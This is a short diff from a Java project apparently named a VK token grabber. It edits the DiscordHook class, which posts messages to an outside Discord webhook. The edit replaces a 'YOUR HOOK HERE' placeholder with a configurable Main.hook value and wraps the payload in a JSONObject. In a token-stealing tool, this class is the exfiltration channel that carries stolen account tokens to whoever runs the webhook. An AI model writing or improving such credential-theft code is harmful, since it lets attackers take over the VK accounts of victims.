@@ -1,9 +1,11 @@
 package com.github.dedinc.vktokengrabber.utils;
 
+import org.json.JSONObject;
+import com.github.dedinc.vktokengrabber.Main;
+
 public class DiscordHook {
 
   public static void sendMessage(String username, String message) {
-	  String hook = "YOUR HOOK HERE";
-	  Request.post(hook, "{\"content\": \"" + message + "\", \"username\": \"" + username + "\"}");
+	  Request.post(Main.hook, new JSONObject("{\"content\": \"" + message + "\", \"username\": \"" + username + "\"}"));
   }
 }
